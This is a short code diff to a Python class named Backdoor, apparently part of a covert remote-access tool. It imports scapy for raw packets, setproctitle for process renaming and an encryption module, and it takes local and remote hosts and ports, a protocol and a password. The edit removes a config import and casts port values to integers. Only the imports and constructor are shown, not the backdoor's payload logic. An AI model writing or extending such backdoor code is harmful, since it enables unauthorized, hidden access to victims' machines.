@@ -1,7 +1,6 @@
 import socket, os, sys, time, logging
 from scapy.all import *
 import setproctitle
-import backdoorConfig
 import encryption
 import netifaces
 import helpers
@@ -11,10 +10,10 @@ class Backdoor(object):
     def __init__(self, lhost, lport, lisport, rhost, rport, proto, password):
         self.state = 0
         self.localIP = lhost
-        self.localPort = lport
-        self.listenPort = lisport
+        self.localPort = int(lport)
+        self.listenPort = int(lisport)
         self.remoteIP = rhost
-        self.remotePort = rport
+        self.remotePort = int(rport)
         self.protocol = proto.upper()
 
         self.password = password
